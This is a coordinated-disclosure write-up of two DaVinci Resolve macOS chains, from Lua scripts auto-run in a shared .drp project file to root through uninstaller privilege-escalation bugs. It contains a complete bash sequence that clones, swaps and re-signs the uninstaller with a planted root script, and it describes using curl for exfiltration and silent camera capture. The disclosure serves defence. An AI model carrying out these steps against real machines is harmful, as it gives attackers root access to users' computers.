# DaVinci Resolve on macOS: Remote Root from a Project File — Two Chains, One Patch

**Security research disclosure — Blackmagic Design DaVinci Resolve**

| | |
|---|---|
| **Affected** | DaVinci Resolve 17.x – 21.0.4 on macOS (arm64 / x86_64) |
| **First chain** | 21.0.2 — BMD-005 (RCE) → BMD-002 (world-writable dir LPE) → root |
| **Second chain** | 21.0.4 — BMD-005 (RCE) → BMD-003 (uninstaller replacement LPE) → root |
| **Impact** | Remote root code execution, triggered by opening a shared project file |
| **Disclosure** | Coordinated disclosure to Blackmagic Design |

---

## TL;DR

DaVinci Resolve — Blackmagic Design's industry-standard video editor — shipped a chain of
vulnerabilities that let an attacker achieve **remote root code execution on macOS** from a
single malicious `.drp` project file: unsandboxed Lua execution on project open, escalated to
root through a privilege-escalation bug.

Blackmagic Design patched the original escalation path. When I re-tested the updated build, I
found a **second, independent escalation path** that restored the same remote-to-root chain. This
write-up documents both chains, the patch, and the bypass.

---

## Part 1 — The Original Chain (21.0.2)

The first chain combined three bugs, all confirmed on DaVinci Resolve 21.0.2.

### BMD-005 — Remote Code Execution via Project Files (Critical)

DaVinci Resolve's Fusion page allows Lua scripting on composition tools via fields like
`FrameRenderScript`. This script runs every time the tool renders a frame — which happens
automatically when the playhead sits on a Fusion Composition clip in the timeline.

The critical issue: **these scripts are persisted inside `.drp` project files and execute
without any warning, prompt, or sandbox when the project is opened.**

A `.drp` file is a ZIP archive containing XML. The Fusion composition data is stored in a
`CompositionBA` field as a hex-encoded, zlib-compressed blob. Inside that blob, tool definitions
carry a `FrameRenderScript` field holding arbitrary Lua.

The Lua environment is **completely unsandboxed**:

| Capability | API | Impact |
|---|---|---|
| Execute shell commands | `os.execute()` | Run any command as the current user |
| Read command output | `io.popen()` | Exfiltrate data, enumerate the system |
| Read/write files | `io.open()` | Access any file the user can |
| Environment variables | `os.getenv()` | Read `HOME`, `PATH`, credentials in env |
| Load native code | `ffi.load()` | Load arbitrary `.dylib` in-process |
| Network access | via `os.execute('curl …')` | C2, data exfiltration |

The payload executes the moment the victim opens the project and the timeline renders the Fusion composition frame.

### BMD-002 — Local Privilege Escalation via a World-Writable Directory (High)

DaVinci Resolve's application-support directory was installed world-writable, with no sticky bit:

```
drwxrwxrwx  root  staff  /Library/Application Support/Blackmagic Design/DaVinci Resolve/
```

Inside it lived several root-owned shell scripts executed **as root** during uninstall and update
operations:

```
-rwxr-xr-x  root  staff  configure-panel.sh
-rwxr-xr-x  root  staff  configure-dp.sh
-rwxr-xr-x  root  staff  StartBMDPanelDaemon
-rwsr-sr-x  root  staff  BMDPanelDaemon.app/.../BMDPanelDaemon   (SUID root)
```

The `Uninstall Resolve.app` binary requests `system.privilege.admin`, then runs these scripts as
`uid=0`. Because the directory had no sticky bit, **any local user could rename and replace
those scripts** — the next uninstall/update executed the attacker's code as root.

### BMD-004 — TCC Bypass via Inherited Permissions (High)

Fusion's Lua exposes LuaJIT's FFI, which can load arbitrary native `.dylib` files into the
DaVinci Resolve process. Because that code runs **inside** Resolve's process, it inherits all of
Resolve's macOS TCC grants — camera, microphone, and screen recording — with **no new permission
prompt**. A `constructor` that captures a camera frame and exfiltrates it runs silently.

### The Chain

```
Attacker crafts malicious .drp project file
         |
         v
Victim opens the project (import, Project Server sync, or Blackmagic Cloud)
         |
         v
Stage 1 — FrameRenderScript executes as the current user      [BMD-005]
         |   proves RCE, then replaces configure-panel.sh
         v
Victim uninstalls or updates DaVinci Resolve
         |
         v
Stage 2 — Uninstaller escalates to root, calls replaced script as root   [BMD-002]
         |
         v
FULL ROOT COMPROMISE — attacker payload runs as uid=0
```

---

## Part 2 — The Patch

Blackmagic Design patched **BMD-002**: the uninstaller no longer executes the shell scripts in
the world-writable application-support directory, removing the root-execution path that the
first chain relied on.

The escalation half of the chain was dead. The RCE half (BMD-005) and the TCC bypass (BMD-004)
remained. So I went back to the updated build and looked for a different way to cross from
user-level RCE to root.

---

## Part 3 — The New Chain (21.0.4)

In the updated version I found a **second, independent privilege-escalation bug** that restores
the full remote-to-root chain.

### BMD-003 — Local Privilege Escalation via Uninstaller Replacement (High)

DaVinci Resolve's application directory is installed group-writable:

```
drwxrwxr-x  root  staff  /Applications/DaVinci Resolve/
```

On macOS every standard user account is a member of the `staff` group, so any local user can
create, rename, and delete entries within this directory — including the uninstaller bundle.

The `Uninstall Resolve.app` binary uses Apple's deprecated `AuthorizationExecuteWithPrivileges`
API to run its embedded `uninstall.sh` as root after the user authenticates. That API has been
deprecated since macOS 10.7 (2011) precisely because it does **not** verify what it executes —
it runs the specified path as root after authentication, with no integrity check.

While the uninstaller's individual files are owned by root (`755 root:staff`), the writable
parent directory enables the classic rename-and-replace attack: the attacker can't modify files
*inside* the bundle, but they can move the whole bundle out of the way and drop a modified copy
in its place.

#### The Attack

```bash
# 1. Clone the uninstaller (preserves UI, icons, binary, everything)
ditto "/Applications/DaVinci Resolve/Uninstall Resolve.app" \
      "/Applications/DaVinci Resolve/Uninstall_Clone.app"

# 2. Swap the original out and the clone in (parent dir is group-writable)
mv "/Applications/DaVinci Resolve/Uninstall Resolve.app" \
   "/Applications/DaVinci Resolve/Uninstall_Backup.app"
mv "/Applications/DaVinci Resolve/Uninstall_Clone.app" \
   "/Applications/DaVinci Resolve/Uninstall Resolve.app"

# 3. Replace the script inside the (attacker-owned) clone
rm "/Applications/DaVinci Resolve/Uninstall Resolve.app/Contents/Resources/uninstall.sh"
cat > "/Applications/DaVinci Resolve/Uninstall Resolve.app/Contents/Resources/uninstall.sh" << 'EOF'
#!/bin/sh
echo "LPE achieved" > /tmp/root-proof.txt
id       >> /tmp/root-proof.txt
whoami   >> /tmp/root-proof.txt
date     >> /tmp/root-proof.txt
EOF
chmod 755 "/Applications/DaVinci Resolve/Uninstall Resolve.app/Contents/Resources/uninstall.sh"

# 4. Re-sign with an ad-hoc signature so Gatekeeper accepts it
codesign --remove-signature "/Applications/DaVinci Resolve/Uninstall Resolve.app"
codesign --force --deep --sign - "/Applications/DaVinci Resolve/Uninstall Resolve.app"
```

#### Result

When any user later runs the uninstaller — uninstall, troubleshoot, or prepare an upgrade — they
see the identical, legitimate-looking dialog, enter their admin password, and the attacker's
script runs as root:

```
$ cat /tmp/root-proof.txt
LPE achieved
uid=501(t) gid=20(staff) euid=0(root) egid=0(wheel) ...
root
Wed Aug  7 14:32:10 PDT 2026
```

### Why This Is Distinct from BMD-002

| | BMD-002 (patched) | BMD-003 (this finding) |
|---|---|---|
| **Directory** | `/Library/Application Support/.../DaVinci Resolve/` | `/Applications/DaVinci Resolve/` |
| **Permissions** | `777` (world-writable, no sticky bit) | `775 root:staff` |
| **Access required** | Any user | Any user in `staff` (all standard macOS users) |
| **Target** | `configure-panel.sh`, `configure-dp.sh` | The entire `Uninstall Resolve.app` bundle |
| **Root mechanism** | Uninstaller calls replaced scripts as root | Uninstaller calls `AuthorizationExecuteWithPrivileges` on replaced `uninstall.sh` |
| **Attack** | Simple `mv` + write replacement script | Clone bundle, replace internal script, re-sign |

The BMD-002 patch did **not** remediate this — it targets a different directory, a different
permission model, and a different root-execution mechanism.

### The New Chain

```
Attacker crafts malicious .drp project file
         |
         v
Victim opens the project
         |
         v
Stage 1 — FrameRenderScript executes as the current user              [BMD-005]
         |   clones the uninstaller, swaps it, plants root payload,
         |   re-signs the bundle — all silently
         v
Victim runs "Uninstall Resolve.app" (or the payload prompts them to)
         |
         v
Stage 2 — AuthorizationExecuteWithPrivileges runs uninstall.sh as root   [BMD-003]
         |
         v
Root execution
```

The BMD-005 payload automates the entire uninstaller replacement: it `ditto`-clones the bundle,
moves the original to a backup path, writes the root payload into the clone, and re-signs it.
The payload passes through to the original `uninstall.sh` so the uninstall UI behaves normally.

---

## Impact

| Aspect | Detail |
|---|---|
| Attack type | RCE → LPE → root |
| User interaction | Open a shared project (1 click); later an uninstall |
| Visibility | No warnings, no prompts, no visual indicators |
| Delivery | `.drp` via email/file share, Project Server, Blackmagic Cloud |
| TCC abuse | Silent camera / microphone / screen capture (BMD-004) |
| Affected versions | 17.x – 21.0.4 on macOS |

---

## Remediation

**For Users**

- Do not open `.drp` project files from untrusted sources.
- Be cautious connecting to unfamiliar Project Servers or Blackmagic Cloud libraries.

-
---

## Disclosure Timeline

- ** **2026-06-18 - Full report submitted to Blackmagic Design (coordinated disclosure).
- 2026-08-07  - BMD-002 patch confirmed; second chain (BMD-003) found on 21.0.4.
- 2026-08-13 - Reported the new findings.
- 2026-08-14 - Response from BMD
- 2026-10-06 - Public disclosure.
---

*Research conducted on macOS (Apple Silicon) with SIP enabled and default security
configuration. Reported to Blackmagic Design through coordinated disclosure.*
